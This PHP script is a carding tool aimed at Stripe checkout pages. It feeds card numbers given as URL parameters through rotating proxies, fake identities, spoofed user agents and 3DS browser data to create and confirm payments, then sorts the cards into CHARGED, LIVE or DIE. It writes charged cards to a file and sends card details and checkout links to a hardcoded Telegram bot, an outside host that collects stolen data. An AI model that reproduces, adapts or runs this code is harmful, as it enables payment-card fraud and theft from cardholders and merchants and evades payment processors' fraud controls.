<?php

error_reporting(0);

// Random information API
$resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
$a = json_decode($resp);
$full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
$name = $a->hello->person->first_name ?? "Alice";
$lname  = $a->hello->person->last_name ?? "Schuberg";
$phone      = $a->hello->person->phone;
$ua         = $a->hello->person->ua;
$street     = $a->hello->street->name ?? "314 alden ave";
$city       = $a->hello->street->city ?? "rohnert park";
$zip        = $a->hello->street->zip ?? "94928";
$state      = $a->hello->street->state ?? "CA";
$state_full = $a->hello->street->state_full ?? "California";
$regionId   = $a->hello->street->regionId ?? "12";
$country    = $a->hello->street->country ?? "United States";
$fivenums   = rand(1000, 9999); // Generate 5 random numbers

$sec = $_GET['cslive'];
$pk = $_GET['pklive'];
$colink = $_GET['colink'];
$amt = $_GET['xamount'];
$email = $_GET['xemail'];

$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$ips_accounts = array(
1 =>    '104.234.11.110:8020',
        '172.86.123.167:8020',
        '', //this is your default hosting server, so just leave it blank
        '157.254.195.104:8020',
        '166.0.94.105:8020',
        '166.0.94.111:8020'
    );
$rotateips = $ips_accounts[array_rand($ips_accounts)];
$proxy = !empty($ip) ? $ip : ''.$rotateips.'';
$proxyauth = !empty($hydra) ? $hydra : '';

$email2 = urlencode($email);
if(empty($email)) {
$email = 'aliceschuberg'.rand(0000, 9999).'@gmail.com';
}
$xemail = $email;

list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
$scc = implode('+', str_split($cc, 4));
$m = ltrim($mm, "0"); $mm === "10" ? $m = "10" : $mm;
strlen($yyyy) == 2 ? $yyyy = '20' . $yyyy : null; $yy = substr($yyyy, 2,2);
$card = "$cc|$mm|$yy|$cvv";
$type = $cc[0] == '4' ? 'Visa' : 'Mastercard'; 


function g($str, $start, $end, $decode=false){   
    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
  }

function c($l){
    $x = '0123456789abcdefghijklmnopqrstuvwxyz';
    $y = strlen($x);
    $z = '';
  
  for ($i=0; $i<$l ; $i++) { 
   $z .= $x[rand(0, $y - 1)];
  }
    return $z;
  } 

$guid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$muid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);

// SET YOUR COOKIES
if (!is_dir("cookies")) {
    mkdir("cookies");
}
$cookies = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie" . rand(10000, 9999999) . ".txt";
$cookietempfile = fopen($cookies, 'w+');
fclose($cookietempfile);

$mask = substr_replace($cc,'xxxxxxxxxx',0,10);
$extrap = $mask."|".$mm."|".$yy;
$extrap;
///////////////=============================////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $ip = curl_exec($ch);
$ips = g($ip,'"query":"','"');
$myip = "<font class='text-white'>$ips</font><br>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&consent[terms_of_service]=accepted&key='.$pk.'');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/init');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pk.'&eid=NA&browser_locale=en-GB&redirect_type=url');
$curl = curl_exec($ch);
curl_close($ch);
 $curl;
 $amttt = g($curl,'"unit_amount_decimal": "','"');
 $xmail = g($curl,'"customer_email": "','"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]=hak&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.$street.'&billing_details[address][city]=Manila&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
$pm = curl_exec($ch);
curl_close($ch);
$id = g($pm, '"id": "','"');





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/confirm');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount='.$amttt.'&last_displayed_line_item_group_details[subtotal]='.$amttt.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pk.'');
$ppage2 = curl_exec($ch);
curl_close($ch);
$client_secret = g($ppage2, '"client_secret": "','"');
$xplode = explode('_secret', $client_secret);
$pi = $xplode[0];
$three_d = g($ppage2, '"three_d_secure_2_source": "','",');
$message = g($ppage2, '"message": "','"');
$success = g($ppage2, '"success_url": "','"');





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$three_d.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImY2NjQ4NWVmLTQ1ZjItNDEyZi05Y2I3LWE5ZGFhMTE0MTY2ZCJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22851%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+M'.rand(11,99).'G)+AppleWebKit%2F'.rand(111,999).'.'.rand(11,99).'+(KHTML%2C+like+Gecko)+Chrome%2F'.rand(11,99).'.0.0.0+Mobile+Safari%2F'.rand(111,999).'.'.rand(11,99).'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pk.'');
$authenticate = curl_exec($ch);
curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pk.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$final = curl_exec($ch);
$dcode2 = json_decode($final)->last_payment_error->decline_code;
$msg = json_decode($final)->last_payment_error->message;
$status = g($final, '"status": "','"');
$dcode = g($final, '"decline_code": "','"');
curl_close($ch);
sleep(5);

//* Start of getting BIN Information *//

// Get the first 6 digits (BIN) of the credit card number
$bin = substr($credit_card, 0, 6);

// Lookup the BIN database from https://binlist.net/ with 5 retries
$max_attempts = 3; // maximum number of attempts to make
$attempt = 0; // current attempt number

$binlist_response = false;

while(!$binlist_response && $attempt <= $max_attempts) {
    $binlist_api_url = "https://lookup.binlist.net/" . $cc;
    $binlist_response = @file_get_contents($binlist_api_url); // use @ to suppress errors
    $binlist_data = json_decode($binlist_response, true);

    //if(!empty($binlist_data)) {
        // data found, break out of the loop
        //break;
    //}

    // increment attempt counter
    $attempt++;

    // wait for 1 second before sending the next request
    //sleep(1);
}

// check if valid data was found
if(!empty($binlist_data)) {
    $find_cc_country = isset($binlist_data['country']['alpha2']) ? $binlist_data['country']['alpha2'] : '';
    $cctype = isset($binlist_data['type']) ? $binlist_data['type'] : '';
    $find_bank_name = isset($binlist_data['bank']['name']) ? $binlist_data['bank']['name'] : '';

    if(!empty($find_cc_country)){
        $cc_country = "<span class='badge badge-secondary'>$find_cc_country</span>";
    }
    if(!empty($find_bank_name)){
        $bank_name = "<span class='badge badge-secondary'>$find_bank_name</span>";
    }
} else {
    // no valid data found after maximum attempts
    // handle error here, e.g. display an error message
}


// Check if the input is a CVV or CCN
#$cctype = (preg_match('/^\d{3,4}$/', $cc)) ? 'CVV' : ((preg_match('/^\d{12,19}$/', $cc)) ? 'CCN' : 'Unknown');

// Check if the card type is debit or credit
if(strtolower($cctype) == 'debit'){
  $cctype = '<span class="badge badge-secondary">Debit</span>';
} else if(strtolower($cctype) == 'credit'){
  $cctype = '<span class="badge badge-secondary">Credit Card</span>';
} else {
  $cctype = '';
}

// Check the card type
if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa</span>';
} elseif (preg_match('/^5[1-5][0-9]{14}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Mastercard</span>';
} elseif (preg_match('/^3[47][0-9]{13}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">American Express</span>';
} elseif (preg_match('/^6(?:011|5[0-9][0-9])[0-9]{12}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Discover</span>';
} elseif (preg_match('/^(?:2131|1800|35\d{3})\d{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">JCB</span>';
} elseif (preg_match('/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Diners Club</span>';
} elseif (preg_match('/^(62|88)\d{16}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">UnionPay</span>';
} elseif (preg_match('/^(5[06789]|6)[0-9]{10,17}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Maestro</span>';
} elseif (preg_match('/^4(026|17500|405|508|844|91[37])/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa Electron</span>';
} elseif (preg_match('/^6[0-9]{15}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">RuPay</span>';
} else {
    $scheme = '';
}

#############SET DESTINATION OF YOUR TG BOT
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
$chatID = urlencode('-1001815647781');
$amttt = intval($amttt)/100;

#############SEND TO TG BOT WHEN CHARGED
$charged_message = "Successful Checkout\r\n\nBIN:\r\n$card\r\nSuccess URL:\r\n".urldecode($success)."\r\nAmount: $amttt\r\n\nChecked from:\r\n$domain";
$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($charged_message).'';

#############SEND TO TG BOT WHEN INSUFFBAL
$insuf_message = "Insufficient Funds\r\n\nBIN: $card\r\nAmount to bill: $amttt\r\nStripe Checkout link:\r\n".urldecode($colink)."\r\n\nChecked from:\r\n$domain";
$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($insuf_message).'';
    
#############BOT RETRY TO SEND IF ITS NOT WORKS
$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;

/////////===================/////////////////
if (strpos($final, '"status": "succeeded"')) {
    while (!$sendchargedtotg && $num_retries < $max_retries) {
    $sendchargedtotg = @file_get_contents($sendcharged);
    $num_retries++;
    echo ''.$myip.'<span class="badge badge-success">#CHARGED</span> <font class="text-white">'.$cc.'|'.$mm.'|'.$yy.'</font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>Amount: '.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>';
    fwrite(fopen('auto-charged-ccs.txt', 'a'), $card."\r\n");
    }
exit;
}
elseif(strpos($final, '"insufficient_funds"')) {
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
}
elseif(strpos($ppage2, '"insufficient_funds"')) {
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
}
elseif(strpos($pm, '"insufficient_funds"')) {
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
}
elseif(strpos($ppage2, '"type": "intent_confirmation_challenge"')){
   
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Blocked by CAPTCHA (change your proxy)</span><br>";
}
elseif(strpos($ppage2, '"message": "Your payment has already been processed."')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Your stripe checkout link is expired</span><br>";
}
elseif($status == "requires_action"){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site (Possible errors: [$dcode : $status])</span><br>";
}
elseif(strpos($ppage2, '"status": "requires_action"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site (Possible errors: [$dcode : $status])</span><br>"; 
}
elseif(strpos($ppage2, '"decline_code": "generic_decline"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
    
}
elseif(strpos($pm, '"decline_code": "generic_decline"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
}
elseif(strpos($ppage2, '"message": "An error has occurred confirming the Checkout Session."')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'><b>Payment Failed - CHECK YOUR PK/CS/EMAIL</b></span><br>";
    
    
}
else {
echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment Failed (Possible errors: [$code $decline_code $status $msg $dcode2 $message $dcode]</span><br>"; 
    
    
}
// DELETE COOKIES AT IBA PANG MGA LIBAG
if (is_file($cookies) && is_writable($cookies)) {
    unlink($cookies);
    unset($ch);
    flush();
    ob_flush();
    ob_end_flush();
}

?>

